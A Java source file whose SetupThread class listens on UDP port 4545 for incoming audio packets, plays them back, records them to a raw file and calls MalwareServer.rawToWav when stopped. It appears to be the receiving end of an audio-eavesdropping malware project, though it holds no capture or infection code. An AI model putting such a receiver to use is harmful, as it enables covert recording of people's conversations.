
import java.awt.event.WindowEvent;
import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketTimeoutException;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.FloatControl;
import javax.sound.sampled.SourceDataLine;
import javax.swing.JOptionPane;


public class SetupThread extends Thread
{
    static AudioInputStream ais;
    static AudioFormat format;
    static DataLine.Info dataLineInfo;
    static SourceDataLine sourceDataLine;
    static int port = 4545;
    static int sampleRate = 44100;
    static RecordingThread recThread = null;
    static DataOutputStream out = null;
    static File file = new File("recording.raw");
    static boolean status = true;
    MainMenu mainmenu = null;
    
    SetupThread(MainMenu menu)
    {
        this.mainmenu = menu;
    }
    
    public void run() 
    {   
        try
        {
                JOptionPane.showMessageDialog(null, "Creating Connection\nConfiguring Incoming Packet\nReady To Stream And Record...", "Status", JOptionPane.INFORMATION_MESSAGE);
		
                System.out.println("Creating Connection");
		DatagramSocket serverSocket = new DatagramSocket(port);

		byte[] receiveData = new byte[3584];

		System.out.println("Configuring Audio");
		format = new AudioFormat(sampleRate, 16, 1, true, false);
		dataLineInfo = new DataLine.Info(SourceDataLine.class, format);
		sourceDataLine = (SourceDataLine) AudioSystem.getLine(dataLineInfo);
		sourceDataLine.open(format);
		sourceDataLine.start();

		FloatControl volumeControl = (FloatControl) sourceDataLine.getControl(FloatControl.Type.MASTER_GAIN);
		volumeControl.setValue(1.00f);

		System.out.println("Configuring Incoming Packet");
		DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
		ByteArrayInputStream baiss = new ByteArrayInputStream(receivePacket.getData());

		System.out.println("Ready To Stream And Record...");
		if(status == true)
		{
                    this.mainmenu.setStatus("Recording");
                    recThread = new RecordingThread();
                    recThread.start();
		}
		
		serverSocket.setSoTimeout(2000);
		out = new DataOutputStream(new FileOutputStream(file));
                
		while (status == true)
		{   
			try
			{
                            serverSocket.receive(receivePacket);
                            out.write(receiveData, 0, receiveData.length);
                            ais = new AudioInputStream(baiss, format, receivePacket.getLength());
                            playBack(receivePacket.getData());                           
			}
			catch(SocketTimeoutException e)
			{
				//System.out.println("Timeout reached!!!");
			}
		}

		try 
		{
			MalwareServer.rawToWav(file);
			sourceDataLine.drain();
			sourceDataLine.close();
			serverSocket.close();
                        out.close();
			file.delete();
                        this.mainmenu.setStatus("Done");
                        JOptionPane.showMessageDialog(null, "Good Bye", "Status", JOptionPane.INFORMATION_MESSAGE); 
                        mainmenu.dispatchEvent(new WindowEvent(mainmenu, WindowEvent.WINDOW_CLOSING));
                } 
		catch (IOException t) 
		{
			System.out.println(t);
                }
		System.out.println("Done!");
        }
        catch(Exception e)
        {

        }
    }
    
    	public static void playBack(byte soundbytes[])
	{
		try
		{
			sourceDataLine.write(soundbytes, 0, soundbytes.length);
		}
		catch (Exception e)
		{
			System.out.println("No output to speakers");
			e.printStackTrace();
		}
	}
    
    	public static void setStatus(boolean val)
	{
		status = val;
		System.out.println("SetupThread Status change");
		if(recThread != null)
		{
			//recThread.interrupt();
		}
	}
}
